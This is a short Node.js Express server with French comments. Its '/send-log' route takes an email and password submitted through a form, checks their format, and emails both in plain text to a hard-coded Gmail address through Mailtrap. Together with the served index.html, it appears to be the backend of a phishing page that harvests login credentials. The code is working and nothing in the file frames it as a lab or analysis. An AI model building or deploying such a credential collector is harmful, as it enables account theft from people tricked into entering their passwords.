require("dotenv").config();

const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const path = require("path");
const emailValidator = require('email-validator'); // Utilisation d'un validateur d'email

const app = express();
const port = 3000;

app.use(express.static(path.join(__dirname)));
app.use(bodyParser.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/send-log", (req, res) => {
  const { email, password } = req.body;

  // Validation de l'email
  if (!emailValidator.validate(email)) {
    return res.status(400).send("Email invalide");
  }

  // Validation de la longueur du mot de passe
  if (password.length < 6) {
    return res.status(400).send("Le mot de passe doit contenir au moins 6 caractères");
  }

  // Créer un transporteur d'email avec Nodemailer
  const transporter = nodemailer.createTransport({
    host: process.env.MAILTRAP_HOST, // Hôte de Mailtrap
    port: process.env.MAILTRAP_PORT, // Port de Mailtrap (par défaut 2525)
    auth: {
      user: process.env.MAILTRAP_USER, // Ton utilisateur Mailtrap
      pass: process.env.MAILTRAP_PASSWORD, // Ton mot de passe Mailtrap
    },
  });

  // Options de l'email
  const mailOptions = {
    from: process.env.MAILTRAP_USER,
    to: "luccabondi@gmail.com",
    subject: "Nouveau message de log",
    text: `Email : ${email}\nMot de passe : ${password}`,
  };

  // Envoyer l'email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Erreur d'envoi de l'email :", error);  // Afficher l'erreur dans la console
      return res.status(500).send("Erreur d'envoi : " + error); 
    }
    console.log('Email envoyé : ' + info.response);  // Afficher la réponse de l'email dans la console
    res.send("Log envoyé avec succès !");
  });
});

app.listen(port, () => {
  console.log(`Serveur démarré sur http://localhost:${port}`);
});
